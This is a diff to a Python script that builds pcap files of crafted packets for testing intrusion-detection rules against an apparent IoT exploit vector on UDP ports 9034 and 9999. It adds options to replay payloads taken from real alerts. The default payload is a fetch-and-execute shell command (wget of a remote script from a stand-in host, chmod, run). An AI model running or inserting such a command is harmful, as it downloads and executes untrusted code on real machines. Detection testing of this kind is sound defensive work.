@@ -89,21 +89,40 @@ def main() -> int:
     ap.add_argument("--src", default="203.0.113.1", help="source IP (default: TEST-NET-3)")
     ap.add_argument("--dst", default="192.168.1.10",
                     help="destination IP - must be inside HOME_NET (default: 192.168.1.10)")
+    ap.add_argument("--payload",
+                    help="replay a specific payload instead of the built-in one. "
+                         "Paste the network.data.decoded value from a real alert "
+                         "to test the rules against traffic that actually arrived.")
+    ap.add_argument("--payload-file",
+                    help="read the payload from a file as raw bytes, for payloads "
+                         "that are binary or awkward to quote on a command line")
+    ap.add_argument("--dport", type=int, action="append",
+                    help="destination port; repeat for several packets "
+                         "(default: 9034 and 9999)")
     args = ap.parse_args()
 
-    payload = b"wget http://198.51.100.7/x.sh; chmod +x x.sh; ./x.sh"
+    if args.payload_file:
+        with open(args.payload_file, "rb") as fh:
+            payload = fh.read()
+    elif args.payload:
+        # Accept the usual escapes so a copied payload_printable pastes cleanly.
+        payload = args.payload.encode().decode("unicode_escape").encode("latin-1")
+    else:
+        payload = b"wget http://198.51.100.7/x.sh; chmod +x x.sh; ./x.sh"
+
+    dports = args.dport or [9034, 9999]
 
     packets = [
-        # Realtek vector, carrying the kit fingerprint.
-        build_packet(args.src, args.dst, 41234, 9034, payload),
-        # Same shape on the UDP/9999 vector, to exercise a second rule.
-        build_packet(args.src, args.dst, 41235, 9999, payload),
+        build_packet(args.src, args.dst, 41234 + i, dport, payload)
+        for i, dport in enumerate(dports)
     ]
 
     write_pcap(args.output, packets)
     sys.stderr.write(
-        "wrote %s: %d packets, dst %s (must be inside HOME_NET)\n"
-        % (args.output, len(packets), args.dst)
+        "wrote %s: %d packet(s) to port(s) %s, dst %s (must be inside HOME_NET), "
+        "payload %d bytes\n"
+        % (args.output, len(packets), ",".join(str(p) for p in dports),
+           args.dst, len(payload))
     )
     return 0
 
